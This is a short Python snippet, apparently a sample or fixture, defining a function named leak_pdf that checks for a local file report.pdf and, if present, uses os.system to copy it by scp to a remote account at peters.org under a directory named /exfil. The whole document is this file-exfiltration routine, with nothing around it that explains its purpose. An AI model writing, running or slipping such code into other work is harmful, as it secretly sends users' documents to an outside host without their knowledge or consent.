import os
def leak_pdf():
    if os.path.exists("report.pdf"):
        os.system("scp report.pdf test@peters.org:/exfil")